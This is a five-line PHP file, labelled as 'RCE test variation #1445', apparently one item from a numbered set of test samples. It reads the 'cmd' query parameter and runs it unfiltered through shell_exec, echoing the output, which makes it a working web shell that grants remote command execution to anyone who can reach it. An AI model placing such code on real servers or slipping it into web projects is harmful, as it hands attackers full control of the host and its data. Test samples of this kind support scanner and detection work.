<?php
// RCE test variation #1445
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>